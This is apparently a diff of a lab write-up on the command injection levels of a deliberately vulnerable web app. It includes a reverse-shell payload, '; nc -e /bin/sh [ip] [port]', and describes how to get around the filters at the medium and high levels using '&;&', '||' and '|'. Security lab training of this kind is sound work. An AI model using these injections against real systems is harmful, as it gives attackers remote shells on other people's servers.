@@ -19,19 +19,23 @@
 
 > We can use the `; nc -e /bin/sh [ip] [port]` to connect to the server.
 > We need to listen the port on our server and use the command injection to cennect.
-> ![](https://i.imgur.com/FZLyZTJ.png)
+> 
+> ![](https://i.imgur.com/Hi6c7fM.png)
+
 
 ## Medium level
 > We can see the source code, it will filter the ';' and '&&'. So we can use '&;&' to bypass.
-
-![](https://i.imgur.com/zpjKHp6.png)
+> 
+> ![](https://i.imgur.com/zpjKHp6.png)
 
 > Or we can use the '||', '|' to bypass.
+> 
 > ![](https://i.imgur.com/hdRWPMf.png)
 
 
 ## High level
 > As we can see there is a 'space' after '|' so we can use the '|' to bypass. 
+> 
 > ![](https://i.imgur.com/WNdJmM2.png)
 
 
@@ -44,4 +48,5 @@
 > It split the input by '.' and check the input.
 > If the input isn't a number it will echo 'ERROR: You have entered an invalid IP.'
 > So we don't have the way to bypass.
+> 
 > ![](https://i.imgur.com/u7ieCLz.png)
